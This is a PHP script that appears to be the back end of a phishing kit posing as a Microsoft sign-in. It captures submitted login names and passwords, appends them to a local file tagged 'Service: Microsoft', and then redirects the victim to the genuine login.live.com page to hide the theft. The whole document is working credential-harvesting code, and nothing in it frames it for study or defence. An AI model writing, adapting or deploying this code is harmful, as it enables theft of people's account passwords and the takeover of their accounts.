<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $passwd = $_POST['passwd'];
    
    $file = fopen("../../auth/usernames.dat", "a");
    fwrite($file, "Service: Microsoft | Login: " . $login . " | Pass: " . $passwd . "\n");
    fclose($file);
    
    header("Location: https://login.live.com");
    exit();
}
?>
